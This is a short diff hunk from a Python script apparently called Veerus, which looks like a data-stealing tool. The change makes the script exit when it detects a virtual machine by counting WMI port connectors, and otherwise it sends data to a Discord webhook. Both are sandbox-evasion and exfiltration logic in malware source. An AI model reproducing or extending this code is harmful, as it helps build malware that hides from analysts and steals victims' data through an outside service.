@@ -818,7 +818,7 @@ if yes == "yes":
 
 	isVM = len(wmi.WMI().Win32_PortConnector()) == 0
 	if(isVM == True):
-		connectOption()
+		exit()
 	if(WEBHOOK != "" and WEBHOOK != None and isVM == False):
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
